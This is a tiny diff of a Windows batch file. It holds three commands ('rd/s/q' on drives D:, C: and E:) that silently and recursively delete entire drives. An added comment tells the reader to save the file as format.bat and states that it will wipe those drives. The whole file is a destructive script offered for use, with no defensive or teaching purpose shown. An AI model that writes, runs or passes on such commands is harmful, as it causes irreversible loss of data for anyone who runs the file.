@@ -1,3 +1,5 @@
 rd/s/q D:
 rd/s/q C:
 rd/s/q E:
+
+# Delete this, and save file as format.bat. Code will delete drives D:, C:, E:
